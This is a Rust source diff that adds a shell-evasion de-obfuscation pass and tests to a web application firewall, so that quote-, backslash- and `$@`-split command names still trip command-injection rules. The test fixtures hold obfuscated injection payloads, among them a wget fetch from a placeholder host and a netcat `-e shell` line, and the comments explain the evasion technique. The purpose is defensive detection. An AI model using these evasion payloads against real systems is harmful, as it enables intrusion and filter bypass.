@@ -460,6 +460,17 @@ impl Waf {
 		})
 	}
 
+	/// Like [`match_raw`](Self::match_raw) but return only the lowest-index enabled rule **of
+	/// `category`** that fires, ignoring every other category. The shell-evasion de-obfuscation
+	/// pass uses this so an aggressive quote/backslash strip can only ever surface a
+	/// command-injection signature — never accidentally trip an unrelated rule on the mangled form.
+	fn match_raw_in_category(&self, haystack: &str, location: &str, category: WafCategory) -> Option<WafMatch> {
+		self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx] && self.meta[idx].1 == category).min().map(|idx| {
+			let (rule_id, category) = self.meta[idx];
+			WafMatch { rule_id, category, location: location.to_owned(), score: None }
+		})
+	}
+
 	/// Inspect one field whose encoding follows path/header rules (`%XX` only, `+` is a
 	/// literal). Body inspection and the tests use this; query strings use
 	/// [`inspect_field`](Self::inspect_field) with `plus_is_space = true`.
@@ -523,6 +534,16 @@ impl Waf {
 		let unctrl = strip_control_chars(&entity);
 		if unctrl != entity
 			&& let Some(m) = self.match_raw(&unctrl, location)
+		{
+			return Some(m);
+		}
+		// 8. Match the shell-evasion-stripped form, command-injection rules ONLY: an attacker splits
+		//    a command word with quotes/backslashes/empty `$@` expansions (`c'a't`, `c\at`, `c$@at`)
+		//    so the literal `cmdi_*` signature never appears until the shell reassembles it. The
+		//    category filter keeps this aggressive strip from surfacing an unrelated signature.
+		let deobf = strip_shell_evasion(&norm.decoded);
+		if deobf != norm.decoded
+			&& let Some(m) = self.match_raw_in_category(&deobf, location, WafCategory::CommandInjection)
 		{
 			return Some(m);
 		}
@@ -656,6 +677,19 @@ impl Waf {
 			self.match_all_raw(&unctrl, location, &mut extra);
 			for m in extra {
 				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
+					out.push(m);
+				}
+			}
+		}
+		// And the shell-evasion-stripped form, contributing only its command-injection matches (the
+		// aggressive quote/backslash strip is scoped to that category), so a `c'a't`-obfuscated
+		// command scores like its literal form. Deduped within the field.
+		let deobf = strip_shell_evasion(&norm.decoded);
+		if deobf != norm.decoded {
+			let mut extra = Vec::new();
+			self.match_all_raw(&deobf, location, &mut extra);
+			for m in extra {
+				if m.category == WafCategory::CommandInjection && !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
 					out.push(m);
 				}
 			}
@@ -919,6 +953,40 @@ fn html_entity_decode_once(input: &str) -> (String, bool) {
 		i += 1;
 	}
 	(String::from_utf8_lossy(&out).into_owned(), changed)
+}
+
+/// De-obfuscate a Unix shell command word by removing the no-op metacharacters an attacker inserts
+/// *inside* a command name to break a literal signature while the shell still runs it — the
+/// character-insertion RCE-evasion class (OWASP-CRS rules 932230/932235, the "RCE evasion prefixes"
+/// called out in the CRS 4.28.0 release). Three no-op forms are stripped:
+///
+/// - **Quote insertion** — `'` and `"` are dropped, keeping their content, so `c'a't` / `c"a"t` →
+///   `cat` (the shell removes the quotes and concatenates).
+/// - **Backslash escapes** — a `\` is dropped, keeping the following character, so `c\at` → `cat`
+///   (`\c` → `c` for an ordinary char).
+/// - **Empty positional expansions** — `$@` / `$*` expand to nothing in a no-argument injection
+///   context, so `c$@at` / `c$*at` → `cat`.
+///
+/// The result is fed to [`Waf::match_raw_in_category`] with [`WafCategory::CommandInjection`] only,
+/// so this deliberately aggressive strip can surface a de-obfuscated shell command but can never
+/// mangle input into an unrelated (SQLi/XSS/…) signature. Byte-wise with [`String::from_utf8_lossy`],
+/// mirroring [`percent_decode_once`], so multi-byte UTF-8 survives. The existing `cmdi_*` signatures
+/// (which anchor on a leading `;`/`&`/`|`/backtick/`$` separator) then fire on the reassembled word.
+fn strip_shell_evasion(input: &str) -> String {
+	let b = input.as_bytes();
+	let mut out: Vec<u8> = Vec::with_capacity(b.len());
+	let mut i = 0;
+	while i < b.len() {
+		match b[i] {
+			b'\'' | b'"' | b'\\' => i += 1, // drop the quote/backslash, keep what follows
+			b'$' if matches!(b.get(i + 1), Some(b'@' | b'*')) => i += 2, // empty `$@`/`$*` expansion
+			_ => {
+				out.push(b[i]);
+				i += 1;
+			}
+		}
+	}
+	String::from_utf8_lossy(&out).into_owned()
 }
 
 /// Strip the C0 control characters a browser silently drops while parsing a URL scheme, an HTML
@@ -1656,6 +1724,51 @@ mod tests {
 		let waf = Waf::starter();
 		assert!(waf.inspect_str("total=$IFSprofit", "query").is_none(), "$IFSprofit should not false-positive");
 		for uri in ["/docs/if-statements", "/api/config?tpl=${IF}-then"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
+		}
+	}
+
+	#[test]
+	fn shell_evasion_transforms() {
+		// Quote/backslash insertion and empty `$@`/`$*` expansions inside a command word are
+		// removed; ordinary text (and multi-byte UTF-8) is untouched.
+		assert_eq!(strip_shell_evasion("c'a't"), "cat");
+		assert_eq!(strip_shell_evasion(r#"c"a"t"#), "cat");
+		assert_eq!(strip_shell_evasion(r"c\at"), "cat");
+		assert_eq!(strip_shell_evasion("c$@at"), "cat");
+		assert_eq!(strip_shell_evasion("w$*get"), "wget");
+		assert_eq!(strip_shell_evasion("plain café"), "plain café");
+	}
+
+	#[test]
+	fn char_insertion_rce_is_caught() {
+		// OWASP-CRS 932230/932235 character-insertion evasion: a command word split by quotes,
+		// backslashes, or empty `$@`/`$*` expansions reassembles to a `cmdi_*` signature after the
+		// strip. Covers the raw and percent-encoded (`%5c` backslash, `%27` quote) delivery forms.
+		let waf = Waf::starter();
+		// Targets chosen to trip no other category at the raw step, so the match is attributable to
+		// the de-obfuscated command word alone (`inspect_str` still runs the percent-decode pass).
+		for payload in [
+			"; c'a't secret.txt",
+			r"| w\get http://host/x",
+			"& n\"c\" -e shell",
+			"; c$@at note.txt",
+			";%20c%27a%27t%20note.txt", // percent-encoded quotes
+			";%20c%5cat%20note.txt",    // percent-encoded backslash
+		] {
+			let m = waf.inspect_str(payload, "query").unwrap_or_else(|| panic!("{payload} should be caught after shell de-obfuscation"));
+			assert_eq!(m.category, WafCategory::CommandInjection, "{payload}");
+		}
+	}
+
+	#[test]
+	fn shell_evasion_strip_is_scoped_to_command_injection() {
+		// The aggressive quote/backslash strip must not surface an unrelated signature: a value whose
+		// *stripped* form would look like a quoted SQL tautology is not blocked by this pass (the raw
+		// form, lacking the tautology shape, is clean), because the pass only accepts cmdi matches.
+		let waf = Waf::starter();
+		// No leading shell separator + command word, so nothing de-obfuscates into a cmdi rule.
+		for uri in ["/note?q=O%27Brien%20and%20Sons", "/path?p=C%3A%5CUsers%5Cbin", "/q?s=it%27s%20a%20test"] {
 			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
